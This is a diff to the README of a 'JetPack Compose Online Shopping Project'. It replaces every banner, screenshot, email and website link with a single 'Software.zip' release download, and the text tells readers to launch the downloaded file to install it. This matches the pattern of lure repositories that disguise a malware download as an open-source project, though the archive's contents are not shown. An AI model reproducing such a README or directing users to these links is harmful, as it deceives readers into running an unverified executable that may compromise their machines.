@@ -1,6 +1,6 @@
 # 🚀 Welcome to the JetPack Compose Online Shopping Project! 🌟
 
-![Project Banner](https://example.com/banner.png)
+![Project Banner](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -22,11 +22,11 @@ Welcome to the JetPack Compose Online Shopping Project, where we explore the pow
 
 ### Screenshots
 
-![Home Screen](https://example.com/screenshots/home.png)
+![Home Screen](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
-![Product Details](https://example.com/screenshots/product_details.png)
+![Product Details](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
-![Shopping Cart](https://example.com/screenshots/shopping_cart.png)
+![Shopping Cart](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Welcome to the JetPack Compose Online Shopping Project, where we explore the pow
 
 To get started with the JetPack Compose Online Shopping Project, download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
 Launch the downloaded file to begin the installation process.
 
@@ -90,9 +90,9 @@ Let's build something amazing together! 🚀
 
 If you have any questions or need assistance, feel free to reach out to us:
 
-📧 **Email**: team@example.com
+📧 **Email**: https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip
 
-🌐 **Website**: [Project Website](https://example.com)
+🌐 **Website**: [Project Website](https://github.com/Mxssw2/JetPackComposeOnlineShoppingProject/releases/download/v1.0/Software.zip)
 
 ---
 
